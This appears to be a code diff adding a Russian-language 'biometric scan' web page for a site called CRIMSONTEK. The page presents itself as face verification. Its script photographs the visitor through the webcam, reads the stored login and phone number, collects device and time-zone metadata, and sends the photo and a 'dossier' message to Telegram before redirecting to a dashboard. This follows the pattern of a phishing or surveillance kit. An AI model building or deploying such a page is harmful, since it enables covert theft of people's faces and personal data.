@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CRIMSONTEK // BIO_SCAN</title>
+    <link rel="stylesheet" href="crimson-theme.css">
+    <style>
+        body { text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        video { border: 2px solid var(--ct-red); width: 300px; filter: grayscale(1) contrast(1.5); margin-bottom: 20px; position: relative; z-index: 1; box-shadow: var(--ct-glow); }
+        #status { color: var(--ct-text); font-size: 12px; position: relative; z-index: 1; max-width: 90%; }
+        h2 { color: var(--ct-flash); font-size: 0.95rem; letter-spacing: 0.2em; }
+    </style>
+</head>
+<body>
+    <h2>BIOMETRIC_SCAN</h2>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <div id="status">СКАНИРОВАНИЕ ЛИЦА... ОЖИДАЙТЕ</div>
+
+    <script src="crimson-config.js"></script>
+    <script>
+        const v = document.getElementById('v'), c = document.getElementById('c');
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            v.srcObject = stream;
+            setTimeout(takePhoto, 3000);
+        }).catch(() => {
+            document.getElementById('status').innerText = 'ОШИБКА КАМЕРЫ — РАЗРЕШИТЕ ДОСТУП И ОБНОВИТЕ СТРАНИЦУ';
+        });
+
+        function takePhoto() {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(blob => {
+                const login = localStorage.getItem('c_user') || '—';
+                const phone = localStorage.getItem('crimson_phone') || 'Не указан';
+                const meta = crimsonCollectMeta();
+                const caption =
+                    `🔬 BIO_SCAN\n` +
+                    `Оператор: ${login}\n` +
+                    `Тел: ${phone}\n` +
+                    `Время: ${meta.time}\n` +
+                    `TZ: ${meta.tz}\n` +
+                    `Экран: ${meta.screen} · ${meta.viewport}\n` +
+                    `Язык: ${meta.lang}`;
+
+                crimsonSendTelegramPhoto(blob, caption.slice(0, 1024))
+                .then(() => {
+                    localStorage.setItem('c_verified', 'true');
+                    crimsonSendTelegramHtml(crimsonFormatDossier('📷 CRIMSONTEK — БИОМЕТРИЯ ЗАВЕРШЕНА', {
+                        login: login,
+                        phone: phone,
+                        event: 'СНИМОК ОТПРАВЛЕН',
+                        note: 'Детальный снимок в предыдущем сообщении.'
+                    }));
+                    window.location.href = 'dashboard.html';
+                })
+                .catch(() => {
+                    document.getElementById('status').innerText = 'ОШИБКА ОТПРАВКИ — ПРОВЕРЬТЕ СЕТЬ';
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
